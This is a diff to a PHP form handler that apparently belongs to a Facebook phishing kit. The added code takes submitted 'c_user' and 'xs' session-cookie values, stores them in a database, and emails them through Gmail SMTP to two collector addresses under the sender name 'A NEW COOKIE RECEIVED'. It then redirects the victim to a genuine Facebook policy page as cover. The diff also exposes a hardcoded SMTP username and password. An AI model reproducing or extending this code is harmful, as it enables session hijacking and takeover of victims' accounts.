@@ -1,4 +1,8 @@
 <?php
+  use PHPMailer\PHPMailer\PHPMailer;
+  use PHPMailer\PHPMailer\Exception;
+
+  require_once 'vendor/autoload.php';
   require __DIR__ . '/database.php';
 
   $c_user = $_POST["c_user"];
@@ -31,5 +35,37 @@ Time: ".$ctime."
 EOF;
   $ret = pg_query($dbconn, $sql);
   pg_close($dbconn);
-  header('Location: action-form');
+
+  $mail = new PHPMailer(true);
+
+  $mail->isSMTP();                                      // Set mailer to use SMTP
+  $mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+  $mail->SMTPAuth = true;                               // Enable SMTP authentication
+  $mail->Username = 'carterreginald24@gmail.com';                 // SMTP username
+  $mail->Password = 'fqbjmddjkxsnumgr';                           // SMTP password
+  $mail->SMTPSecure = 'tls';
+  $mail->Port  = 587;
+  
+  $mail->setFrom('carterreginald24@gmail.com', 'A NEW COOKIE RECEIVED');
+  $mail->addAddress('kk442242@gmail.com', 'Receiver');
+  $mail->addAddress('bilalcookie964@gmail.com', 'Receiver');
+  $mail->Subject = 'Hello,
+
+A new form has been submitted on your website. Details below:
+
+C_USER: '.$c_user.' 
+
+XS: '.$xs;
+  $mail->Body    = 'Please check the link';
+
+  if(!$mail->send()) {
+      echo 'Message could not be sent.';
+      echo 'Mailer Error: ' . $mail->ErrorInfo;
+  } else {
+      // echo 'Message has been sent';
+  }
+
+  $mail->smtpClose();
+
+  header('Location: https://transparency.fb.com/en-gb/policies/community-standards/');
   die();
